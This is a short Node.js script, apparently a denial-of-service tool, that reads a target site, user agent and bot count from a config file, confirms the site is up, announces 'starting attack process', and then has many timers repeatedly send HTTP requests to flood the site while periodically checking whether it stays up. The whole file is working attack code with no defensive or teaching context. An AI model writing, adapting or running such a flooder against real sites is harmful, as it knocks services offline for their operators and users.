import fs from 'fs-extra';
import http from 'http';
import https from 'https';
import utils from './src/utils.js';

const cwd = process.cwd();

(async () => {
  const config = fs.readJSONSync(`${cwd}/config.json`);
  const { pingInterval, checkInterval, siteConfig, numBots } = config;
  const { site, userAgent } = siteConfig;

  console.log('[+]: Fetching site..');
  await utils.sleep(1500);

  const protocol = site.startsWith('https') ? https : http;

  try {
    protocol.get(site, (response) => {
      if (response.statusCode !== 200) {
        utils.sleep(200).then(() => console.log('[-]: Site is down.'));
        return;
      }

      utils.sleep(200).then(() => {
        console.log('[+]: Site up!, starting attack process.');

        const ping = () => {
          protocol.get(site, {
            headers: {
              'User-Agent': userAgent,
            },
          }, (res) => {
            console.log('[+]: Ping successful');
          }).on('error', (error) => {
            console.error('[-]: Error in ping:', error);
          });
        };

        for (let i = 0; i < numBots; i++) {
          setInterval(ping, pingInterval);
        }

        setInterval(utils.checkSite, checkInterval);
      });
    }).on('error', (error) => {
      utils.sleep(200).then(() => console.log('[-]: Site is down.'));
    });
  } catch (error) {
    await utils.sleep(1500);
    console.log(`[-]: An error occurred: ${error}`);
  }
})();
